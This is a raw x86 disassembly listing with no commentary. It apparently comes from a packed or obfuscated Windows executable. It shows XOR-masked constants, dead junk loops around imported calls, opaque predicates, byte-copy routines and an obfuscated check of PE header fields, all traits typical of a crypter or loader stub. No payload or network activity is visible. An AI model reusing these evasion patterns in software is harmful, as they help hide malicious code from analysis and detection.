  401cd9:	push   0x4
  401cdb:	pop    ecx
  401cdc:	sub    ecx,eax
  401cde:	add    ecx,DWORD PTR [ebp-0x1c]
  401ce1:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401ce8:	mov    DWORD PTR [ebp+0x10],ecx
  401ceb:	mov    DWORD PTR [ebp-0xcc],ebx
  401cf1:	mov    eax,DWORD PTR [ebp+0xc]
  401cf4:	mov    DWORD PTR [ebp-0xc8],eax
  401cfa:	mov    eax,DWORD PTR [ebp+0x10]
  401cfd:	mov    DWORD PTR [ebp-0xc4],eax
  401d03:	mov    eax,DWORD PTR [ebp-0x2c]
  401d06:	xor    eax,esi
  401d08:	add    eax,edi
  401d0a:	mov    DWORD PTR [ebp-0xc0],eax
  401d10:	lea    eax,[ebp-0x78]
  401d13:	mov    DWORD PTR [ebp-0xbc],eax
  401d19:	mov    eax,DWORD PTR [ebp-0xcc]
  401d1f:	xor    eax,esi
  401d21:	add    eax,edi
  401d23:	mov    DWORD PTR [ebp-0xcc],eax
  401d29:	lea    eax,[ebp-0xcc]
  401d2f:	push   eax
  401d30:	mov    eax,DWORD PTR [ebp-0x3c]
  401d33:	xor    eax,esi
  401d35:	add    eax,edi
  401d37:	push   eax
  401d38:	mov    eax,ds:0x424455
  401d3d:	push   0x4243ab
  401d42:	push   DWORD PTR [eax]
  401d44:	call   0x402470
  401d49:	mov    eax,DWORD PTR [ebp+0xc]
  401d4c:	mov    ecx,DWORD PTR [ebp+0x10]
  401d4f:	mov    DWORD PTR [ebp-0x6c],ecx
  401d52:	mov    ecx,DWORD PTR [ebp-0x18]
  401d55:	xor    ecx,esi
  401d57:	mov    DWORD PTR [ebp-0x1c],eax
  401d5a:	add    ecx,edi
  401d5c:	jmp    0x401f02
  401d61:	lea    edx,[ecx+eax*1]
  401d64:	mov    DWORD PTR [ebp+0x10],edx
  401d67:	mov    edx,DWORD PTR [ebp-0x6c]
  401d6a:	sub    edx,ecx
  401d6c:	mov    DWORD PTR [ebp+0xc],edx
  401d6f:	mov    edx,DWORD PTR [ebp+0xc]
  401d72:	mov    DWORD PTR [ebp-0x44],edx
  401d75:	mov    edx,DWORD PTR [ebp+0x10]
  401d78:	mov    DWORD PTR [ebp-0x40],0xf89c85b5
  401d7f:	mov    DWORD PTR [ebp-0x64],edx
  401d82:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  401d89:	mov    edx,DWORD PTR [ebp-0x40]
  401d8c:	xor    edx,esi
  401d8e:	add    edx,edi
  401d90:	mov    DWORD PTR [ebp+0xc],edx
  401d93:	mov    edx,DWORD PTR [ebp-0x40]
  401d96:	xor    edx,esi
  401d98:	add    edx,edi
  401d9a:	mov    DWORD PTR [ebp-0x4],edx
  401d9d:	mov    DWORD PTR [ebp-0x60],0xf89c85d5
  401da4:	mov    DWORD PTR [ebp-0x5c],0xf89c85bc
  401dab:	mov    edx,DWORD PTR [ebp-0x40]
  401dae:	mov    ebx,DWORD PTR [ebp-0x44]
  401db1:	xor    edx,esi
  401db3:	add    edx,edi
  401db5:	cmp    ebx,edx
  401db7:	je     0x401ef6
  401dbd:	mov    eax,DWORD PTR [ebp+0x10]
  401dc0:	xor    eax,esi
  401dc2:	mov    edx,0xffcd8d23
  401dc7:	sub    edx,eax
  401dc9:	add    edx,DWORD PTR [ebp-0x44]
  401dcc:	mov    eax,DWORD PTR [ebp+0x10]
  401dcf:	mov    ebx,DWORD PTR [ebp+0xc]
  401dd2:	xor    eax,esi
  401dd4:	add    eax,edi
  401dd6:	imul   eax,ebx
  401dd9:	cmp    eax,edx
  401ddb:	ja     0x401ef3
  401de1:	mov    edx,DWORD PTR [ebp+0xc]
  401de4:	mov    eax,DWORD PTR [ebp-0x44]
  401de7:	mov    ebx,DWORD PTR [ebp-0x60]
  401dea:	sub    eax,edx
  401dec:	xor    ebx,esi
  401dee:	xor    edx,edx
  401df0:	add    ebx,edi
  401df2:	div    ebx
  401df4:	mov    DWORD PTR [ebp-0x4],eax
  401df7:	mov    eax,DWORD PTR [ebp-0x5c]
  401dfa:	mov    edx,DWORD PTR [ebp-0x4]
  401dfd:	xor    eax,esi
  401dff:	add    eax,edi
  401e01:	cmp    edx,eax
  401e03:	jbe    0x401e13
  401e09:	mov    eax,DWORD PTR [ebp-0x5c]
  401e0c:	xor    eax,esi
  401e0e:	add    eax,edi
  401e10:	mov    DWORD PTR [ebp-0x4],eax
  401e13:	mov    eax,DWORD PTR [ebp-0x60]
  401e16:	mov    edx,DWORD PTR [ebp-0x4]
  401e19:	xor    eax,esi
  401e1b:	add    eax,edi
  401e1d:	imul   eax,edx
  401e20:	mov    DWORD PTR [ebp-0x4],eax
  401e23:	mov    eax,DWORD PTR [ebp-0x40]
  401e26:	mov    edx,DWORD PTR [ebp-0x4]
  401e29:	xor    eax,esi
  401e2b:	add    eax,edi
  401e2d:	cmp    edx,eax
  401e2f:	je     0x401edc
  401e35:	mov    eax,DWORD PTR [ebp-0x4]
  401e38:	mov    DWORD PTR [ebp-0x24],eax
  401e3b:	mov    eax,DWORD PTR [ebp+0xc]
  401e3e:	add    eax,DWORD PTR [ebp-0x64]
  401e41:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  401e48:	mov    DWORD PTR [ebp-0x48],eax
  401e4b:	mov    eax,0xf89c85b2
  401e50:	mov    DWORD PTR [ebp-0x50],eax
  401e53:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  401e5a:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  401e61:	mov    DWORD PTR [ebp-0x54],eax
  401e64:	mov    eax,DWORD PTR [ebp-0x2c]
  401e67:	xor    eax,esi
  401e69:	add    eax,edi
  401e6b:	jmp    0x401e98
  401e70:	mov    eax,DWORD PTR [ebp-0x54]
  401e73:	mov    edx,DWORD PTR [ebp-0x4]
  401e76:	xor    eax,esi
  401e78:	add    eax,edi
  401e7a:	imul   eax,edx
  401e7d:	mov    edx,DWORD PTR [ebp-0x48]
  401e80:	mov    BYTE PTR [eax+edx*1],0x0
  401e84:	mov    eax,DWORD PTR [ebp-0x10]
  401e87:	mov    edx,DWORD PTR [ebp-0x50]
  401e8a:	xor    eax,esi
  401e8c:	xor    edx,esi
  401e8e:	add    eax,edi
  401e90:	add    edx,edi
  401e92:	imul   eax,edx
  401e95:	add    eax,DWORD PTR [ebp-0x4]
  401e98:	mov    DWORD PTR [ebp-0x4],eax
  401e9b:	mov    eax,DWORD PTR [ebp-0x4]
  401e9e:	mov    edx,DWORD PTR [ebp-0x24]
  401ea1:	cmp    edx,eax
  401ea3:	jb     0x401e70
  401ea9:	mov    eax,DWORD PTR [ebp-0x50]
  401eac:	mov    edx,DWORD PTR [ebp-0x24]
  401eaf:	xor    eax,esi
  401eb1:	add    eax,edi
  401eb3:	imul   eax,edx
  401eb6:	mov    edx,DWORD PTR [ebp-0x2c]
  401eb9:	xor    edx,esi
  401ebb:	add    edx,edi
  401ebd:	or     eax,edx
  401ebf:	mov    edx,DWORD PTR [ebp+0x10]
  401ec2:	xor    edx,esi
  401ec4:	add    eax,edx
  401ec6:	mov    edx,DWORD PTR [ebp+0x10]
  401ec9:	xor    edx,esi
  401ecb:	add    eax,edx
  401ecd:	mov    edx,DWORD PTR [ebp+0xc]
  401ed0:	lea    eax,[eax+edx*1+0x64e5ba]
  401ed7:	jmp    0x401eeb
  401edc:	mov    eax,DWORD PTR [ebp+0x10]
  401edf:	mov    edx,DWORD PTR [ebp+0xc]
  401ee2:	xor    eax,esi
  401ee4:	lea    eax,[eax+edx*1+0x3272dd]
  401eeb:	mov    DWORD PTR [ebp+0xc],eax
  401eee:	jmp    0x401dbd
  401ef3:	mov    eax,DWORD PTR [ebp-0x1c]
  401ef6:	mov    edx,DWORD PTR [ebp-0x3c]
  401ef9:	xor    edx,esi
  401efb:	lea    ecx,[ecx+edx*1+0x3272dd]
  401f02:	lea    edx,[ecx-0x3272dd]
  401f08:	xor    edx,esi
  401f0a:	cmp    edx,0xf89c95b5
  401f10:	jne    0x401d61
  401f16:	mov    ecx,DWORD PTR [ebp-0x18]
  401f19:	mov    edx,DWORD PTR [ebp-0x3c]
  401f1c:	mov    ebx,DWORD PTR [ebp-0x18]
  401f1f:	xor    edx,esi
  401f21:	mov    dl,BYTE PTR [edx+eax*1+0x3272dd]
  401f28:	xor    ecx,esi
  401f2a:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  401f31:	xor    ebx,esi
  401f33:	mov    BYTE PTR [ebx+eax*1+0x3272dd],dl
  401f3a:	mov    edx,DWORD PTR [ebp-0x3c]
  401f3d:	xor    edx,esi
  401f3f:	mov    BYTE PTR [edx+eax*1+0x3272dd],cl
  401f46:	mov    eax,DWORD PTR [ebp-0x3c]
  401f49:	mov    eax,DWORD PTR [ebp-0x8]
  401f4c:	xor    eax,esi
  401f4e:	add    eax,edi
  401f50:	mov    ds:0x4244b9,eax
  401f55:	mov    eax,DWORD PTR [ebp-0x8]
  401f58:	xor    eax,esi
  401f5a:	add    eax,edi
  401f5c:	mov    ds:0x4244b1,eax
  401f61:	lea    eax,[ebp-0x28]
  401f64:	mov    DWORD PTR [ebp-0x88],eax
  401f6a:	lea    eax,[ebp+0x4]
  401f6d:	mov    DWORD PTR [ebp-0x28],eax
  401f70:	mov    eax,DWORD PTR [ebp-0x28]
  401f73:	test   eax,eax
  401f75:	je     0x40209d
  401f7b:	mov    DWORD PTR [ebp-0x80],0xf152c3a
  401f82:	mov    DWORD PTR [ebp-0x74],0x712ed0f
  401f89:	mov    DWORD PTR [ebp-0x7c],0x373fc2d
  401f90:	mov    DWORD PTR [ebp-0x84],0x72670a1d
  401f9a:	call   0x407339
  401f9f:	mov    eax,DWORD PTR [ebp-0x20]
  401fa2:	mov    eax,DWORD PTR [ebp-0xc]
  401fa5:	mov    eax,DWORD PTR [ebp-0x8]
  401fa8:	mov    DWORD PTR [ebp+0xc],eax
  401fab:	mov    eax,eax
  401fad:	mov    eax,ds:0x424435
  401fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  401fb8:	mov    eax,DWORD PTR [eax]
  401fba:	cdq    
  401fbb:	mov    ebx,eax
  401fbd:	mov    eax,0xfabdbeed
  401fc2:	add    ebx,eax
  401fc4:	adc    edx,0xffffffff
  401fc7:	and    DWORD PTR [ebp-0x10],0x0
  401fcb:	xor    edx,0x0
  401fce:	mov    DWORD PTR [ebp-0x54],edx
  401fd1:	mov    edx,DWORD PTR [ebp+0xc]
  401fd4:	mov    DWORD PTR [ebp-0x14],edx
  401fd7:	mov    ecx,0x8a29a127
  401fdc:	xor    ebx,ecx
  401fde:	add    DWORD PTR [ebp-0x14],eax
  401fe1:	mov    edx,DWORD PTR [ebp-0x14]
  401fe4:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401fe8:	xor    edx,ecx
  401fea:	mov    DWORD PTR [ebp-0x4c],edx
  401fed:	mov    edx,DWORD PTR [ebp-0x10]
  401ff0:	xor    edx,0x0
  401ff3:	mov    DWORD PTR [ebp-0x48],edx
  401ff6:	cmp    DWORD PTR [ebp-0x4c],ebx
  401ff9:	jne    0x40200b
  401fff:	mov    edx,DWORD PTR [ebp-0x54]
  402002:	cmp    DWORD PTR [ebp-0x48],edx
  402005:	je     0x40203a
  40200b:	mov    edx,DWORD PTR ds:0x424435
  402011:	mov    edx,DWORD PTR [edx+0x1c0]
  402017:	mov    edx,DWORD PTR [edx]
  402019:	xor    ebx,ebx
  40201b:	add    edx,eax
  40201d:	adc    ebx,0xffffffff
  402020:	xor    edx,ecx
  402022:	xor    ebx,0x0
  402025:	cmp    edx,0x70941fc9
  40202b:	jne    0x40209d
  402031:	cmp    ebx,0xffffffff
  402034:	jne    0x40209d
  40203a:	mov    edx,DWORD PTR ds:0x4244b1
  402040:	mov    ebx,DWORD PTR ds:0x4244b9
  402046:	xor    edx,ebx
  402048:	mov    DWORD PTR ds:0x4244b1,edx
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    ebx,DWORD PTR ds:0x4244b1
  402057:	add    ebx,DWORD PTR [edx]
  402059:	mov    edx,DWORD PTR [ebp-0x28]
  40205c:	mov    DWORD PTR [edx],ebx
  40205e:	mov    edx,DWORD PTR [ebp+0xc]
  402061:	xor    esi,edx
  402063:	mov    edx,DWORD PTR ds:0x4244b1
  402069:	add    esi,edi
  40206b:	xor    ebx,ebx
  40206d:	add    esi,eax
  40206f:	adc    ebx,0xffffffff
  402072:	xor    edi,edi
  402074:	xor    esi,ecx
  402076:	xor    ebx,0x0
  402079:	add    edx,eax
  40207b:	adc    edi,0xffffffff
  40207e:	xor    edx,ecx
  402080:	xor    edi,0x0
  402083:	cmp    edx,esi
  402085:	jne    0x40209d
  40208b:	cmp    edi,ebx
  40208d:	jne    0x40209d
  402093:	mov    eax,ds:0x4244b1
  402098:	mov    ds:0x4244b9,eax
  40209d:	mov    eax,ds:0x424435
  4020a2:	push   0x4
  4020a4:	add    eax,0x1cc
  4020a9:	push   eax
  4020aa:	lea    eax,[ebp-0x20]
  4020ad:	push   eax
  4020ae:	call   0x4020cd
  4020b3:	mov    eax,DWORD PTR [ebp-0x20]
  4020b6:	mov    eax,DWORD PTR [eax]
  4020b8:	pop    ebx
  4020b9:	pop    esi
  4020ba:	pop    edi
  4020bb:	leave  
  4020bc:	ret    0xc
  4020bf:	xor    eax,eax
  4020c1:	and    DWORD PTR ds:0x420f60,0x42200c
  4020cb:	inc    eax
  4020cc:	ret    
  4020cd:	push   ebp
  4020ce:	mov    ebp,esp
  4020d0:	sub    esp,0x10
  4020d3:	and    DWORD PTR ds:0x420e96,0x0
  4020dd:	mov    edx,DWORD PTR ds:0x420e96
  4020e3:	inc    edx
  4020e4:	mov    DWORD PTR ds:0x420e96,edx
  4020ea:	cmp    DWORD PTR ds:0x420e96,0xc
  4020f1:	jne    0x4020fd
  4020f7:	call   DWORD PTR ds:0x4247f1
  4020fd:	cmp    DWORD PTR ds:0x420e96,0xb
  402104:	jne    0x402117
  40210a:	mov    edx,DWORD PTR ds:0x420e96
  402110:	inc    edx
  402111:	mov    DWORD PTR ds:0x420e96,edx
  402117:	cmp    DWORD PTR ds:0x420e96,0x1e
  40211e:	jb     0x4020dd
  402124:	mov    DWORD PTR ds:0x422000,0x1a
  40212e:	cmp    DWORD PTR ds:0x422000,0x0
  402135:	je     0x40216d
  40213b:	cmp    DWORD PTR ds:0x422000,0x23
  402142:	jne    0x40214e
  402148:	call   DWORD PTR ds:0x4247f5
  40214e:	mov    ecx,DWORD PTR ds:0x422000
  402154:	dec    ecx
  402155:	mov    DWORD PTR ds:0x422000,ecx
  40215b:	jmp    0x40212e
  402160:	movzx  ecx,BYTE PTR ds:0x420f6c
  402167:	sbb    DWORD PTR ds:0x420ef4,ecx
  40216d:	mov    eax,0xf89c85b5
  402172:	and    DWORD PTR ds:0x422008,0x1b79
  40217c:	mov    DWORD PTR [ebp-0x4],eax
  40217f:	mov    ecx,DWORD PTR ds:0x420f60
  402185:	sub    ecx,DWORD PTR ds:0x420eec
  40218b:	mov    DWORD PTR ds:0x420f60,ecx
  402191:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  402198:	mov    ecx,DWORD PTR [ebp-0x4]
  40219b:	and    DWORD PTR ds:0x420f08,0x0
  4021a5:	mov    edx,DWORD PTR ds:0x420f08
  4021ab:	inc    edx
  4021ac:	mov    DWORD PTR ds:0x420f08,edx
  4021b2:	cmp    DWORD PTR ds:0x420f08,0x27
  4021b9:	jne    0x4021e8
  4021bf:	push   0x88c3
  4021c4:	push   0x163c
  4021c9:	push   0x420ef4
  4021ce:	push   0x4bad
  4021d3:	push   0x581a
  4021d8:	push   0x60bf
  4021dd:	push   0x312d
  4021e2:	call   DWORD PTR ds:0x4247f9
  4021e8:	cmp    DWORD PTR ds:0x420f08,0x1e
  4021ef:	jb     0x4021a5
  4021f5:	push   esi
  4021f6:	mov    edx,0x7510896
  4021fb:	xor    ecx,edx
  4021fd:	mov    DWORD PTR ds:0x420f74,0x11
  402207:	cmp    DWORD PTR ds:0x420f74,0x0
  40220e:	je     0x402263
  402214:	cmp    DWORD PTR ds:0x420f74,0x7
  40221b:	jne    0x402231
  402221:	push   0x19b5
  402226:	push   0x424000
  40222b:	call   DWORD PTR ds:0x4247fd
  402231:	cmp    DWORD PTR ds:0x420f74,0x8
  402238:	jne    0x40224b
  40223e:	mov    esi,DWORD PTR ds:0x420f74
  402244:	dec    esi
  402245:	mov    DWORD PTR ds:0x420f74,esi
  40224b:	mov    esi,DWORD PTR ds:0x420f74
  402251:	dec    esi
  402252:	mov    DWORD PTR ds:0x420f74,esi
  402258:	jmp    0x402207
  40225d:	and    esi,0x2f21
  402263:	mov    esi,0x3272dd
  402268:	push   edi
  402269:	mov    edi,DWORD PTR [ebp+0x10]
  40226c:	add    ecx,esi
  40226e:	cmp    ecx,edi
  402270:	je     0x402335
  402276:	mov    ecx,DWORD PTR [ebp-0x4]
  402279:	mov    edi,DWORD PTR [ebp+0x10]
  40227c:	xor    eax,eax
  40227e:	xor    ecx,edx
  402280:	add    ecx,esi
  402282:	add    edi,0xfabdbeed
  402288:	adc    eax,0xffffffff
  40228b:	xor    eax,0x0
  40228e:	mov    DWORD PTR [ebp-0xc],eax
  402291:	push   ebx
  402292:	xor    ebx,ebx
  402294:	xor    edi,0x8a29a127
  40229a:	mov    eax,ecx
  40229c:	add    eax,0xfabdbeed
  4022a1:	adc    ebx,0xffffffff
  4022a4:	xor    eax,0x8a29a127
  4022a9:	xor    ebx,0x0
  4022ac:	cmp    eax,edi
  4022ae:	jne    0x4022c7
  4022b4:	cmp    ebx,DWORD PTR [ebp-0xc]
  4022b7:	je     0x40232f
  4022bd:	jmp    0x4022c7
  4022c2:	mov    esi,0x3272dd
  4022c7:	mov    eax,DWORD PTR [ebp-0x4]
  4022ca:	mov    edi,DWORD PTR [ebp-0x8]
  4022cd:	xor    edi,edx
  4022cf:	add    edi,esi
  4022d1:	mov    esi,DWORD PTR [ebp+0x8]
  4022d4:	imul   edi,ecx
  4022d7:	mov    ebx,DWORD PTR [ebp+0xc]
  4022da:	xor    eax,edx
  4022dc:	add    eax,ecx
  4022de:	mov    al,BYTE PTR [ebx+eax*1+0x3272dd]
  4022e5:	mov    BYTE PTR [edi+esi*1],al
  4022e8:	mov    eax,DWORD PTR [ebp-0x8]
  4022eb:	mov    esi,DWORD PTR [ebp+0x10]
  4022ee:	xor    eax,edx
  4022f0:	xor    ebx,ebx
  4022f2:	add    esi,0xfabdbeed
  4022f8:	adc    ebx,0xffffffff
  4022fb:	lea    ecx,[ecx+eax*1+0x3272dd]
  402302:	xor    edi,edi
  402304:	xor    esi,0x8a29a127
  40230a:	xor    ebx,0x0
  40230d:	mov    eax,ecx
  40230f:	add    eax,0xfabdbeed
  402314:	adc    edi,0xffffffff
  402317:	xor    eax,0x8a29a127
  40231c:	xor    edi,0x0
  40231f:	cmp    eax,esi
  402321:	jne    0x4022c2
  402327:	cmp    edi,ebx
  402329:	jne    0x4022c2
  40232f:	mov    eax,0xf89c85b2
  402334:	pop    ebx
  402335:	pop    edi
  402336:	pop    esi
  402337:	leave  
  402338:	ret    0xc
  40233b:	push   ebp
  40233c:	mov    ebp,esp
  40233e:	push   ecx
  40233f:	and    eax,0x3e6
  402344:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  40234b:	adc    DWORD PTR ds:0x420e96,ecx
  402351:	mov    eax,DWORD PTR [ebp+0x8]
  402354:	add    DWORD PTR ds:0x420e8e,0x7faa
  40235e:	mov    al,BYTE PTR [eax]
  402360:	add    al,0xb
  402362:	adc    DWORD PTR ds:0x420f74,0x420fac
  40236c:	xor    al,0x71
  40236e:	mov    DWORD PTR ds:0x420f60,0x413c
  402378:	cmp    al,0x29
  40237a:	mov    DWORD PTR ds:0x420f98,0x418e
  402384:	jne    0x40245f
  40238a:	mov    DWORD PTR ds:0x420fb0,0x17
  402394:	cmp    DWORD PTR ds:0x420fb0,0x0
  40239b:	je     0x4023d3
  4023a1:	cmp    DWORD PTR ds:0x420fb0,0x18
  4023a8:	jne    0x4023c1
  4023ae:	push   0x424238
  4023b3:	push   0x0
  4023b5:	push   DWORD PTR [ebp-0x14]
  4023b8:	push   DWORD PTR [ebp-0x14]
  4023bb:	call   DWORD PTR ds:0x424801
  4023c1:	mov    edx,DWORD PTR ds:0x420fb0
  4023c7:	dec    edx
  4023c8:	mov    DWORD PTR ds:0x420fb0,edx
  4023ce:	jmp    0x402394
  4023d3:	mov    eax,DWORD PTR [ebp+0x8]
  4023d6:	and    DWORD PTR ds:0x420f00,0x0
  4023e0:	jmp    0x4023f4
  4023e5:	xor    edx,edx
  4023e7:	or     edx,DWORD PTR ds:0x420f00
  4023ed:	inc    edx
  4023ee:	mov    DWORD PTR ds:0x420f00,edx
  4023f4:	cmp    DWORD PTR ds:0x420f00,0x10
  4023fb:	jae    0x402423
  402401:	cmp    DWORD PTR ds:0x420f00,0x16
  402408:	jne    0x40241e
  40240e:	push   0x420e8a
  402413:	push   0x8874
  402418:	call   DWORD PTR ds:0x424805
  40241e:	jmp    0x4023e5
  402423:	mov    ecx,DWORD PTR [ebp+0x8]
  402426:	add    ecx,DWORD PTR [eax+0x3c]
  402429:	mov    edx,0x7510896
  40242e:	mov    DWORD PTR [ebp+0x8],ecx
  402431:	mov    eax,DWORD PTR [ebp-0x4]
  402434:	xor    eax,edx
  402436:	push   esi
  402437:	mov    esi,DWORD PTR [ebp+0x8]
  40243a:	mov    ecx,0x3272dd
  40243f:	add    eax,ecx
  402441:	cmp    DWORD PTR [esi+0x54],eax
  402444:	pop    esi
  402445:	je     0x402453
  40244b:	mov    eax,DWORD PTR [ebp+0x8]
  40244e:	jmp    0x40246c
  402453:	mov    eax,DWORD PTR [ebp-0x4]
  402456:	xor    eax,edx
  402458:	add    eax,ecx
  40245a:	jmp    0x40246c
  40245f:	mov    eax,DWORD PTR [ebp-0x4]
  402462:	xor    eax,0x7510896
  402467:	add    eax,0x3272dd
  40246c:	leave  
  40246d:	ret    0x4
  402470:	push   ebp
  402471:	mov    ebp,esp
  402473:	sub    esp,0x78
  402476:	push   ebx
  402477:	add    DWORD PTR ds:0x420f74,0x422014
  402481:	push   esi
  402482:	adc    DWORD PTR ds:0x422008,0x3845
  40248c:	push   edi
  40248d:	adc    DWORD PTR ds:0x420f6c,0x5918
  402497:	push   0x1f
  402499:	lea    eax,[ebp-0x78]
  40249c:	or     DWORD PTR ds:0x420f5c,0x420f98
  4024a6:	push   eax
  4024a7:	push   0x0
  4024a9:	sub    DWORD PTR ds:0x420efc,0x7a9b
  4024b3:	call   DWORD PTR ds:0x424809
  4024b9:	push   0x97898797
  4024be:	call   DWORD PTR ds:0x4247cd
  4024c4:	and    ebx,eax
  4024c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4024cd:	and    DWORD PTR ds:0x420e8e,0x0
  4024d7:	mov    ecx,DWORD PTR ds:0x420e8e
  4024dd:	inc    ecx
  4024de:	mov    DWORD PTR ds:0x420e8e,ecx
  4024e4:	cmp    DWORD PTR ds:0x420e8e,0xc
  4024eb:	jne    0x402513
  4024f1:	push   DWORD PTR [ebp-0x18]
  4024f4:	push   0x420ef0
  4024f9:	push   0x1a2a
  4024fe:	push   0x4240c5
  402503:	push   0x11f1
  402508:	push   0x79a7
  40250d:	call   DWORD PTR ds:0x42480d
  402513:	cmp    DWORD PTR ds:0x420e8e,0xb
  40251a:	jne    0x40252d
  402520:	mov    ecx,DWORD PTR ds:0x420e8e
  402526:	inc    ecx
  402527:	mov    DWORD PTR ds:0x420e8e,ecx
  40252d:	cmp    DWORD PTR ds:0x420e8e,0x1f
  402534:	jb     0x4024d7
  40253a:	mov    DWORD PTR ds:0x420e92,0x15
  402544:	cmp    DWORD PTR ds:0x420e92,0x0
  40254b:	je     0x40258c
  402551:	cmp    DWORD PTR ds:0x420e92,0x4
  402558:	jne    0x402564
  40255e:	call   DWORD PTR ds:0x424811
  402564:	cmp    DWORD PTR ds:0x420e92,0x5
  40256b:	jne    0x40257c
  402571:	mov    eax,ds:0x420e92
  402576:	dec    eax
  402577:	mov    ds:0x420e92,eax
  40257c:	mov    eax,ds:0x420e92
  402581:	dec    eax
  402582:	mov    ds:0x420e92,eax
  402587:	jmp    0x402544
  40258c:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  402593:	mov    ecx,DWORD PTR [ebp-0x4]
  402596:	and    DWORD PTR ds:0x420f00,0x0
  4025a0:	xor    eax,eax
  4025a2:	add    eax,DWORD PTR ds:0x420f00
  4025a8:	inc    eax
  4025a9:	mov    ds:0x420f00,eax
  4025ae:	cmp    DWORD PTR ds:0x420f00,0x1d
  4025b5:	jne    0x4025c6
  4025bb:	push   0x420e82
  4025c0:	call   DWORD PTR ds:0x424815
  4025c6:	cmp    DWORD PTR ds:0x420f00,0x1a
  4025cd:	jb     0x4025a0
  4025d3:	mov    ebx,DWORD PTR ds:0x420f9c
  4025d9:	sbb    DWORD PTR ds:0x420f58,ebx
  4025df:	mov    ebx,0x7510896
  4025e4:	xor    ecx,ebx
  4025e6:	mov    eax,ds:0x420e82
  4025eb:	or     eax,DWORD PTR ds:0x420e7a
  4025f1:	mov    ds:0x420e82,eax
  4025f6:	mov    eax,0x3272dd
  4025fb:	dec    DWORD PTR ds:0x420fa0
  402601:	add    ecx,eax
  402603:	and    DWORD PTR ds:0x420e9e,0x420e8a
  40260d:	mov    DWORD PTR [ebp-0x1c],ecx
  402610:	xor    ecx,ecx
  402612:	xor    ecx,DWORD PTR ds:0x422014
  402618:	adc    DWORD PTR ds:0x420ef4,ecx
  40261e:	mov    ecx,DWORD PTR [ebp+0x14]
  402621:	test   ecx,ecx
  402623:	mov    DWORD PTR ds:0x420e96,0x3634
  40262d:	je     0x40263f
  402633:	sub    ecx,esi
  402635:	mov    ecx,DWORD PTR [ebp+0x14]
  402638:	mov    ecx,DWORD PTR [ecx]
  40263a:	or     edi,edi
  40263c:	mov    DWORD PTR [ebp-0x1c],ecx
  40263f:	and    DWORD PTR ds:0x422010,0x634e
  402649:	mov    ecx,0x7665
  40264e:	imul   edx,eax
  402651:	or     DWORD PTR ds:0x422000,0x5329
  40265b:	mov    esi,0x76532
  402660:	add    edx,ecx
  402662:	xchg   esi,ecx
  402664:	mov    edi,0x54354
  402669:	or     DWORD PTR ds:0x420fa4,0x820
  402673:	sub    edx,edi
  402675:	mov    esi,DWORD PTR ds:0x420ea6
  40267b:	mov    esi,DWORD PTR [esi]
  40267d:	or     DWORD PTR ds:0x420e9a,esi
  402683:	mov    ecx,DWORD PTR [ebp-0x4]
  402686:	mov    DWORD PTR ds:0x420fac,0x1c
  402690:	cmp    DWORD PTR ds:0x420fac,0x0
  402697:	je     0x4026e4
  40269d:	cmp    DWORD PTR ds:0x420fac,0x4
  4026a4:	jne    0x4026b8
  4026aa:	push   DWORD PTR [ebp-0x18]
  4026ad:	push   0x676d
  4026b2:	call   DWORD PTR ds:0x4247d5
  4026b8:	cmp    DWORD PTR ds:0x420fac,0x5
  4026bf:	jne    0x4026d2
  4026c5:	mov    esi,DWORD PTR ds:0x420fac
  4026cb:	dec    esi
  4026cc:	mov    DWORD PTR ds:0x420fac,esi
  4026d2:	mov    esi,DWORD PTR ds:0x420fac
  4026d8:	dec    esi
  4026d9:	mov    DWORD PTR ds:0x420fac,esi
  4026df:	jmp    0x402690
  4026e4:	xor    ecx,ebx
  4026e6:	add    ecx,eax
  4026e8:	mov    DWORD PTR [ebp-0x8],ecx
  4026eb:	sbb    esi,DWORD PTR ds:0x420e9a
  4026f1:	mov    ecx,DWORD PTR [ebp-0x14]
  4026f4:	xor    ecx,ebx
  4026f6:	or     DWORD PTR ds:0x420fb0,edi
  4026fc:	add    ecx,eax
  4026fe:	or     DWORD PTR ds:0x420f60,0xf49
  402708:	mov    DWORD PTR [ebp-0x24],ecx
  40270b:	mov    DWORD PTR ds:0x420fa8,0x17
  402715:	cmp    DWORD PTR ds:0x420fa8,0x0
  40271c:	je     0x402758
  402722:	cmp    DWORD PTR ds:0x420fa8,0x22
  402729:	jne    0x402740
  40272f:	push   DWORD PTR [ebp-0x20]
  402732:	push   0x420f04
  402737:	push   DWORD PTR [ebp-0x18]
  40273a:	call   DWORD PTR ds:0x4247d9
  402740:	mov    esi,DWORD PTR ds:0x420fa8
  402746:	dec    esi
  402747:	mov    DWORD PTR ds:0x420fa8,esi
  40274d:	jmp    0x402715
  402752:	sub    ecx,DWORD PTR ds:0x420e9a
  402758:	mov    ecx,DWORD PTR [ebp-0x4]
  40275b:	mov    esi,DWORD PTR ds:0x420e8a
  402761:	xor    DWORD PTR ds:0x420f64,esi
  402767:	xor    ecx,ebx
  402769:	add    ecx,eax
  40276b:	mov    esi,DWORD PTR ds:0x420e82
  402771:	sbb    DWORD PTR ds:0x420f08,esi
  402777:	mov    DWORD PTR [ebp-0x30],ecx
  40277a:	mov    esi,DWORD PTR [ebp-0x4]
  40277d:	xor    esi,ebx
  40277f:	adc    ecx,DWORD PTR ds:0x420e92
  402785:	add    esi,eax
  402787:	mov    ecx,DWORD PTR [ebp-0x24]
  40278a:	sub    ecx,eax
  40278c:	mov    DWORD PTR ds:0x420ef8,0x1fac
  402796:	lea    edx,[esi-0x3272dd]
  40279c:	or     DWORD PTR ds:0x422000,0x620f
  4027a6:	xor    ecx,ebx
  4027a8:	sub    DWORD PTR ds:0x420f74,0x420ef4
  4027b2:	xor    edx,ebx
  4027b4:	cmp    edx,ecx
  4027b6:	mov    DWORD PTR ds:0x422010,0x61b1
  4027c0:	je     0x404db6
  4027c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4027c9:	and    DWORD PTR ds:0x420f64,0x54e0
